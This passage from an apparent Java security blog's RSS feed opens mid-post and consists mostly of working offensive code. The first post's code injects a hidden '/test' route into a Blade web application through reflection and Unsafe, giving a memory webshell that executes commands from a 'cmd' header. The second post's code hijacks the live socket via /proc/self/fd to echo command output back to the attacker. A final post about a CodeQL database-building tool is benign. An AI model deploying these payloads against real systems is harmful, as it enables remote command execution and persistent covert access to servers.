class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Path</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; name = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> name.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        ThreadLocal&lt;Object&gt; objectThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getMap</span> <span class="operator">=</span> ThreadLocal.class.getDeclaredMethod(<span class="string">&quot;getMap&quot;</span>, Thread.class);</span><br><span class="line">        getMap.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">threadLocals</span> <span class="operator">=</span> getMap.invoke(objectThreadLocal, thread);</span><br><span class="line">        Class&lt;?&gt; threadLocalMap = Class.forName(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tablesFiled</span> <span class="operator">=</span> threadLocalMap.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tablesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">table</span> <span class="operator">=</span> tablesFiled.get(threadLocals);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(table); i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> Array.get(table, i);</span><br><span class="line">                System.out.println(o1.getClass().getName());</span><br><span class="line">                <span class="keyword">if</span>(o1.getClass().getName().equals(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry&quot;</span>))&#123;</span><br><span class="line">                    o = Array.get(table, i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        Class&lt;?&gt; entry = Class.forName(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valueField</span> <span class="operator">=</span> entry.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        valueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InternalThreadLocalMap</span> <span class="variable">value</span> <span class="operator">=</span> (InternalThreadLocalMap) valueField.get(o);</span><br><span class="line">        <span class="type">WebContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (value.indexedVariable(i).getClass().getName().equals(<span class="string">&quot;com.hellokaton.blade.mvc.WebContext&quot;</span>)) &#123;</span><br><span class="line">                    context = (WebContext) value.indexedVariable(i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ChannelHandlerContext</span> <span class="variable">channelHandlerContext</span> <span class="operator">=</span> context.getChannelHandlerContext();</span><br><span class="line">        <span class="type">HttpServerHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (HttpServerHandler) channelHandlerContext.handler();</span><br><span class="line">        <span class="type">RouteMethodHandler</span> <span class="variable">routeHandler</span> <span class="operator">=</span> (RouteMethodHandler) unsafe.getObject(handler, unsafe.objectFieldOffset(HttpServerHandler.class.getDeclaredField(<span class="string">&quot;routeHandler&quot;</span>)));</span><br><span class="line">        <span class="type">RouteMatcher</span> <span class="variable">routeMatcher</span> <span class="operator">=</span> (RouteMatcher) unsafe.getObject(routeHandler, unsafe.objectFieldOffset(RouteMethodHandler.class.getDeclaredField(<span class="string">&quot;routeMatcher&quot;</span>)));</span><br><span class="line">        <span class="type">Path</span> <span class="variable">annotation</span> <span class="operator">=</span> Exp.class.getAnnotation(Path.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;annotations: &quot;</span> + annotation);</span><br><span class="line">        <span class="type">Route</span> <span class="variable">route</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Route</span>(HttpMethod.ALL, <span class="string">&quot;/test&quot;</span>, Exp.class, Exp.class.getDeclaredMethod(<span class="string">&quot;exp&quot;</span>));</span><br><span class="line">        route.setTarget(<span class="keyword">new</span> <span class="title class_">Exp</span>(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">addRoute</span> <span class="operator">=</span> routeMatcher.getClass().getDeclaredMethod(<span class="string">&quot;addRoute&quot;</span>, Route.class);</span><br><span class="line">        addRoute.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        addRoute.invoke(routeMatcher,route);</span><br><span class="line">        System.out.println(routeHandler);</span><br><span class="line">        <span class="type">StaticMapping</span> <span class="variable">staticMapping</span> <span class="operator">=</span> routeMatcher.getStaticMapping();</span><br><span class="line">        staticMapping.addRoute(<span class="string">&quot;/test&quot;</span>,HttpMethod.ALL,route);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">(String aaa)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; name = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> name.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        ThreadLocal&lt;Object&gt; objectThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getMap</span> <span class="operator">=</span> ThreadLocal.class.getDeclaredMethod(<span class="string">&quot;getMap&quot;</span>, Thread.class);</span><br><span class="line">        getMap.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">threadLocals</span> <span class="operator">=</span> getMap.invoke(objectThreadLocal, thread);</span><br><span class="line">        Class&lt;?&gt; threadLocalMap = Class.forName(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tablesFiled</span> <span class="operator">=</span> threadLocalMap.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tablesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">table</span> <span class="operator">=</span> tablesFiled.get(threadLocals);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(table); i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> Array.get(table, i);</span><br><span class="line">                <span class="keyword">if</span>(o1.getClass().getName().equals(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry&quot;</span>))&#123;</span><br><span class="line">                    o = Array.get(table, i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        Class&lt;?&gt; entry = Class.forName(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valueField</span> <span class="operator">=</span> entry.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        valueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InternalThreadLocalMap</span> <span class="variable">value</span> <span class="operator">=</span> (InternalThreadLocalMap) valueField.get(o);</span><br><span class="line">        <span class="type">WebContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (value.indexedVariable(i).getClass().getName().equals(<span class="string">&quot;com.hellokaton.blade.mvc.WebContext&quot;</span>)) &#123;</span><br><span class="line">                    context = (WebContext) value.indexedVariable(i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpResponse) context.getResponse();</span><br><span class="line">        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> context.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.header(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        response.body(<span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p>]]></content:encoded>
      
      
      
      <category domain="https://www.n1ght.cn/tags/java/">java</category>
      
      
      <comments>https://www.n1ght.cn/2025/08/21/blade_cc/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>java_linux通用回显马</title>
      <link>https://www.n1ght.cn/2025/08/21/java_linux%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E9%A9%AC/</link>
      <guid>https://www.n1ght.cn/2025/08/21/java_linux%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E9%A9%AC/</guid>
      <pubDate>Thu, 21 Aug 2025 06:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;在LINUX环境下，可以通过文件描述符”&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;fd&amp;#x2F;i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。&lt;/p&gt;
&lt;p&gt;我</description>
        
      
      
      
      <content:encoded><![CDATA[<p>在LINUX环境下，可以通过文件描述符”&#x2F;proc&#x2F;self&#x2F;fd&#x2F;i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。</p><p>我们怎么获取到tcp6的连接</p><p>获取到&#x2F;proc&#x2F;self&#x2F;net&#x2F;tcp6的inode</p><p>然后查看&#x2F;proc&#x2F;self&#x2F;fd下的所有文件的软链接</p><p>获取到inode匹配的最后一个的socket</p><p>获取到FileDescriptor的值，封装到SocketChannelImpl里面。</p><p>然后写入内容，当然你也可以关闭socket连接让后续不去写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.spi.SelectorProvider;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        List&lt;String&gt; canWriteList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; inodeList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/proc/self/net/tcp6&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">tcp6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes);</span><br><span class="line">        <span class="keyword">for</span> (String line : tcp6.split(<span class="string">&quot;\n&quot;</span>)) &#123;</span><br><span class="line">            String[] parts = line.trim().split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (parts.length &gt;= <span class="number">13</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">inode</span> <span class="operator">=</span> parts[<span class="number">9</span>];</span><br><span class="line">                inodeList.add(Integer.parseInt(inode));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/proc/self/fd&quot;</span>);</span><br><span class="line">        File[] files = file.listFiles();</span><br><span class="line">        <span class="keyword">for</span> (File f : files) &#123;</span><br><span class="line">            <span class="keyword">if</span> (f.exists()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Path</span> <span class="variable">path1</span> <span class="operator">=</span> Files.readSymbolicLink(f.toPath());</span><br><span class="line">                    <span class="keyword">if</span> (f.canWrite()) &#123;</span><br><span class="line">                        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;socket:\\[(\\d+)]&quot;</span>);</span><br><span class="line">                        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(path1.toString());</span><br><span class="line">                        <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                            <span class="type">Integer</span> <span class="variable">inode</span> <span class="operator">=</span> Integer.parseInt(matcher.group(<span class="number">1</span>));</span><br><span class="line">                            <span class="keyword">for</span> (Integer integer : inodeList) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (Objects.equals(integer, inode)) &#123;</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> f.getAbsolutePath();</span><br><span class="line">                                    canWriteList.add(path.substring(path.indexOf(<span class="string">&quot;/fd/&quot;</span>)).replaceAll(<span class="string">&quot;/fd/&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;FileDescriptor&gt; c = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取底层的 FileDescriptor</span></span><br><span class="line">            c = FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Integer.TYPE&#125;);</span><br><span class="line">            c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(canWriteList.get(canWriteList.size() - <span class="number">1</span>));</span><br><span class="line">            <span class="type">FileDescriptor</span> <span class="variable">fileDescriptor</span> <span class="operator">=</span> c.newInstance(i);</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.nio.ch.SocketChannelImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(SelectorProvider.class, FileDescriptor.class, <span class="type">boolean</span>.class);</span><br><span class="line">            cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">SelectorProvider</span> <span class="variable">provider</span> <span class="operator">=</span> SelectorProvider.provider();</span><br><span class="line">            <span class="type">SocketChannel</span> <span class="variable">sc</span> <span class="operator">=</span> (SocketChannel) cons.newInstance(provider, fileDescriptor, <span class="literal">false</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectedField</span> <span class="operator">=</span> sc.getClass().getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">            connectedField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            connectedField.set(sc, <span class="number">2</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span>  file.getCanonicalPath()</span><br><span class="line">                    + <span class="string">&quot;/&quot;</span> + canWriteList.get(canWriteList.size() - <span class="number">1</span>) + <span class="string">&quot;: &quot;</span> +</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//            String ret =  new Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next() + &quot;\n&quot;;</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-length:&quot;</span>+ret.length()+<span class="string">&quot;\r\n\r\n&quot;</span>+ret;</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap(header.getBytes());</span><br><span class="line">            <span class="keyword">while</span> (buffer.hasRemaining()) &#123;</span><br><span class="line">                sc.write(buffer);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://www.n1ght.cn/tags/java/">java</category>
      
      
      <comments>https://www.n1ght.cn/2025/08/21/java_linux%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E9%A9%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>codeql带依赖jar包数据库生成</title>
      <link>https://www.n1ght.cn/2025/06/16/codeql%E5%B8%A6%E4%BE%9D%E8%B5%96jar%E5%8C%85%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%9F%E6%88%90/</link>
      <guid>https://www.n1ght.cn/2025/06/16/codeql%E5%B8%A6%E4%BE%9D%E8%B5%96jar%E5%8C%85%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%9F%E6%88%90/</guid>
      <pubDate>Mon, 16 Jun 2025 09:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;codeql带依赖jar包数据库生成&quot;&gt;&lt;a href=&quot;#codeql带依赖jar包数据库生成&quot; class=&quot;headerlink&quot; title=&quot;codeql带依赖jar包数据库生成&quot;&gt;&lt;/a&gt;codeql带依赖jar包数据库生成&lt;/h1&gt;&lt;p&gt;这个月听群友</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="codeql带依赖jar包数据库生成"><a href="#codeql带依赖jar包数据库生成" class="headerlink" title="codeql带依赖jar包数据库生成"></a>codeql带依赖jar包数据库生成</h1><p>这个月听群友聊ai编程比较感兴趣，去试了试便宜的trae，首月3美元。玩了一会儿感觉不写点什么对不起这*<del>3美元</del>*</p><p>于是</p><p><a href="https://github.com/yezere/codeql_n1ght">https://github.com/yezere/codeql_n1ght</a></p><p>也顺便为了方便我使用codeql搭建数据库，毕竟每次手操做还是太累了。</p><p>以前也有师傅问过我怎么搭建带依赖的数据库，其实用ant去构建就行了，但是还是会报错 <del><em>你就说数据库搭建没搭建起来吧</em></del></p><h3 id="直接下载可执行文件"><a href="#直接下载可执行文件" class="headerlink" title="直接下载可执行文件"></a>直接下载可执行文件</h3><p>从 <a href="https://github.com/yezere/codeql_n1ght/releases">Releases</a> 页面下载对应平台的可执行文件。</p><p>-h是帮助</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装所有必要工具（JDK、Apache Ant、CodeQL）</span></span><br><span class="line">./codeql_n1ght -install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用自定义下载地址安装</span></span><br><span class="line">./codeql_n1ght -install -jdk https://your-jdk-url.zip -codeql https://your-codeql-url.zip</span><br></pre></td></tr></table></figure><p>可以去指定工具版本的下载</p><p>创建数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 从 JAR 包创建数据库</span><br><span class="line">./codeql_n1ght -database your-app.jar</span><br><span class="line"></span><br><span class="line"># 从 WAR 包创建数据库</span><br><span class="line">./codeql_n1ght -database your-webapp.war</span><br><span class="line"></span><br><span class="line"># 指定反编译器类型</span><br><span class="line">./codeql_n1ght -database your-app.jar -decompiler fernflower</span><br><span class="line"></span><br><span class="line"># 反编译自己想要的lib，将jar包放入lib文件夹下，打包成zip</span><br><span class="line">./codeql_n1ght -database your-zip.zip</span><br></pre></td></tr></table></figure><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><table><thead><tr><th>参数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>​<code>-install</code>​</td><td>一键安装环境</td><td>​<code>./codeql_n1ght -install</code>​</td></tr><tr><td>​<code>-database</code>​</td><td>指定要分析的 JAR&#x2F;WAR 文件</td><td>​<code>./codeql_n1ght -database app.jar</code>​</td></tr><tr><td>​<code>-decompiler</code>​</td><td>选择反编译器 (procyon|fernflower)</td><td>​<code>./codeql_n1ght -database app.jar -decompiler fernflower</code>​</td></tr><tr><td>​<code>-jdk</code>​</td><td>自定义 JDK 下载地址</td><td>​<code>./codeql_n1ght -install -jdk https://example.com/jdk.zip</code>​</td></tr><tr><td>​<code>-ant</code>​</td><td>自定义 Apache Ant 下载地址</td><td>​<code>./codeql_n1ght -install -ant https://example.com/ant.zip</code>​</td></tr><tr><td>​<code>-codeql</code>​</td><td>自定义 CodeQL 下载地址</td><td>​<code>./codeql_n1ght -install -codeql https://example.com/codeql.zip</code>​</td></tr></tbody></table><h3 id="WAR-包特殊处理"><a href="#WAR-包特殊处理" class="headerlink" title="WAR 包特殊处理"></a>WAR 包特殊处理</h3><p>本工具针对 WAR 包进行了特殊优化：</p><ul><li><strong>Spring Boot JAR&#x2F;WAR</strong>：自动处理 <code>BOOT-INF/classes</code>​ 和 <code>BOOT-INF/lib</code>​ 目录</li><li><strong>传统 WAR</strong>：兼容处理 <code>WEB-INF/classes</code>​ 和 <code>WEB-INF/lib</code>​ 目录</li><li><strong>JSP 文件</strong>：使用专用的 <code>jsp2class.jar</code>​ 进行反编译</li><li><strong>智能路径检测</strong>：自动识别不同的 WAR 包结构</li></ul>]]></content:encoded>
      
      
      
      <category domain="https://www.n1ght.cn/tags/java/">java</category>
      
      
      <comments>https://www.n1ght.cn/2025/06/16/codeql%E5%B8%A6%E4%BE%9D%E8%B5%96jar%E5%8C%85%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%9F%E6%88%90/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
